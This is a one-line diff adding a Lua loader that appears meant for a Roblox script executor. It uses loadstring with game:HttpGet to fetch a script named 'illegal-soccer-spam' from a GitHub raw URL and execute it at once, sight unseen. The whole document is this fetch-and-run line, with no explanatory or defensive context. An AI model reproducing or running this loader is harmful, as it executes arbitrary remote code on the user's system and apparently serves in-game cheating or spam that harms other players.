@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/update-illegal-soccer-spam6-zbej50ioic75g0.lua"))()
